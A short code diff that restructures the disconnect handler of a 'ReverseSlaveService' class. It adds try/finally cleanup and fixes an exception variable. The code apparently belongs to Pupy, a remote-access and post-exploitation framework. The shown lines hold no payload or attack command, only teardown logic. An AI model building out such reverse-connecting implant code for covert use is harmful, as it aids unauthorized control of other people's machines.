@@ -126,30 +126,32 @@ class ReverseSlaveService(Service):
         )
 
     def on_disconnect(self):
-        if self.client.terminated:
-            return
-
-        for cleanup in self.exposed_cleanups:
-            try:
-                cleanup()
-            except Exception as e:
-                pupy.remote_error('Disconnect/cleanup: {}', e)
-
-        self.exposed_cleanups = []
-
         try:
-            self._conn.close()
-        except:
-            pupy.remote_error('Disconnect/close: {}', e)
+            if self.client.terminated:
+                return
 
-        if os.name == 'posix':
+            for cleanup in self.exposed_cleanups:
+                try:
+                    cleanup()
+                except Exception as e:
+                    pupy.remote_error('Disconnect/cleanup: {}', e)
+
+            self.exposed_cleanups = []
+
+        finally:
             try:
-                for _ in xrange(1024):
-                    if not os.waitpid(-1, os.WNOHANG):
-                        break
+                self._conn.close()
+            except Exception as e:
+                pupy.remote_error('Disconnect/close: {}', e)
 
-            except OSError:
-                pass
+            if os.name == 'posix':
+                try:
+                    for _ in xrange(1024):
+                        if not os.waitpid(-1, os.WNOHANG):
+                            break
+
+                except OSError:
+                    pass
 
     def exposed_exit(self):
         logger.debug('TERMINATION REQUEST')
